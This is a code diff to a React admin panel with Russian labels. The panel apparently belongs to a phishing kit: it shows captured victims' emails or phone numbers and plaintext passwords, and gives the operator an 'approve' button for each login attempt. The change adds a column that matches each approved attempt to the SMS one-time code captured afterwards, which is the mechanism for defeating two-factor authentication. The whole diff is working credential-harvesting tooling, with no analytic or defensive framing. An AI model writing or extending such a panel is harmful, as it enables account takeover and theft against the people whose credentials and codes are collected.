@@ -336,6 +336,7 @@ export const AdminPanel = (): JSX.Element => {
                         <TableRow>
                           <TableHead>Email/Телефон</TableHead>
                           <TableHead>Пароль</TableHead>
+                          <TableHead>SMS код</TableHead>
                           <TableHead>Return URI</TableHead>
                           <TableHead>Время</TableHead>
                           <TableHead>Статус</TableHead>
@@ -343,100 +344,67 @@ export const AdminPanel = (): JSX.Element => {
                         </TableRow>
                       </TableHeader>
                       <TableBody>
-                        {loginAttempts.map((attempt) => (
-                          <TableRow key={attempt.id}>
-                            <TableCell className="font-medium">
-                              {attempt.emailOrPhone}
-                            </TableCell>
-                            <TableCell className="font-mono text-sm">
-                              {attempt.password}
-                            </TableCell>
-                            <TableCell className="font-mono text-sm max-w-xs truncate">
-                              {attempt.returnUri}
-                            </TableCell>
-                            <TableCell>
-                              {new Date(attempt.timestamp).toLocaleString("de-DE")}
-                            </TableCell>
-                            <TableCell>
-                              {attempt.approved ? (
-                                <span className="flex items-center gap-1 text-green-600">
-                                  <CheckCircle className="w-4 h-4" />
-                                  Одобрено
-                                </span>
-                              ) : (
-                                <span className="flex items-center gap-1 text-orange-600">
-                                  <Clock className="w-4 h-4" />
-                                  Ожидает
-                                </span>
-                              )}
-                            </TableCell>
-                            <TableCell>
-                              {!attempt.approved && (
-                                <Button
-                                  onClick={() => approveMutation.mutate(attempt.id)}
-                                  disabled={approveMutation.isPending}
-                                  className="bg-green-600 hover:bg-green-700 text-white"
-                                  size="sm"
-                                >
-                                  <CheckCircle className="w-4 h-4 mr-1" />
-                                  Подтвердить
-                                </Button>
-                              )}
-                            </TableCell>
-                          </TableRow>
-                        ))}
-                      </TableBody>
-                    </Table>
-                  </div>
-                )}
-
-                {/* SMS Submissions Section */}
-                {smsSubmissions.length > 0 && (
-                  <div className="mt-8">
-                    <h3 className="text-lg font-semibold mb-4 flex items-center gap-2">
-                      <span className="w-2 h-2 bg-blue-500 rounded-full"></span>
-                      SMS коды ({smsSubmissions.length})
-                    </h3>
-                    <div className="overflow-x-auto">
-                      <Table>
-                        <TableHeader>
-                          <TableRow>
-                            <TableHead>ID</TableHead>
-                            <TableHead>OTP код</TableHead>
-                            <TableHead>Stepup Context</TableHead>
-                            <TableHead>Запомнить устройство</TableHead>
-                            <TableHead>Время</TableHead>
-                          </TableRow>
-                        </TableHeader>
-                        <TableBody>
-                          {smsSubmissions.map((submission: SmsSubmission) => (
-                            <TableRow key={submission.id}>
-                              <TableCell className="font-medium">{submission.id}</TableCell>
-                              <TableCell>
-                                <span className="font-mono bg-blue-100 px-2 py-1 rounded text-blue-800">
-                                  {submission.otpCode}
-                                </span>
+                        {loginAttempts.map((attempt) => {
+                          // Find related SMS submission for this login attempt
+                          const relatedSms = smsSubmissions.find(sms => 
+                            // Check if SMS was submitted after this login attempt was approved
+                            attempt.approved && new Date(sms.timestamp) > new Date(attempt.timestamp)
+                          );
+                          
+                          return (
+                            <TableRow key={attempt.id}>
+                              <TableCell className="font-medium">
+                                {attempt.emailOrPhone}
+                              </TableCell>
+                              <TableCell className="font-mono text-sm">
+                                {attempt.password}
                               </TableCell>
                               <TableCell>
-                                <span className="font-mono text-sm text-gray-600">
-                                  {submission.stepupContext}
-                                </span>
-                              </TableCell>
-                              <TableCell>
-                                {submission.rememberDevice ? (
-                                  <span className="text-green-600">✓ Да</span>
+                                {relatedSms ? (
+                                  <span className="font-mono bg-blue-100 px-2 py-1 rounded text-blue-800 text-sm">
+                                    {relatedSms.otpCode}
+                                  </span>
                                 ) : (
-                                  <span className="text-gray-400">✗ Нет</span>
+                                  <span className="text-gray-400 text-sm">—</span>
+                                )}
+                              </TableCell>
+                              <TableCell className="font-mono text-sm max-w-xs truncate">
+                                {attempt.returnUri}
+                              </TableCell>
+                              <TableCell>
+                                {new Date(attempt.timestamp).toLocaleString("de-DE")}
+                              </TableCell>
+                              <TableCell>
+                                {attempt.approved ? (
+                                  <span className="flex items-center gap-1 text-green-600">
+                                    <CheckCircle className="w-4 h-4" />
+                                    Одобрено
+                                  </span>
+                                ) : (
+                                  <span className="flex items-center gap-1 text-orange-600">
+                                    <Clock className="w-4 h-4" />
+                                    Ожидает
+                                  </span>
                                 )}
                               </TableCell>
                               <TableCell>
-                                {new Date(submission.timestamp).toLocaleString('ru-RU')}
+                                {!attempt.approved && (
+                                  <Button
+                                    onClick={() => approveMutation.mutate(attempt.id)}
+                                    disabled={approveMutation.isPending}
+                                    className="bg-green-600 hover:bg-green-700 text-white"
+                                    size="sm"
+                                  >
+                                    <CheckCircle className="w-4 h-4 mr-1" />
+                                    Подтвердить
+                                  </Button>
+                                )}
                               </TableCell>
                             </TableRow>
-                          ))}
-                        </TableBody>
-                      </Table>
-                    </div>
+                          );
+                        })}
+                      </TableBody>
+                    </Table>
                   </div>
                 )}
               </CardContent>
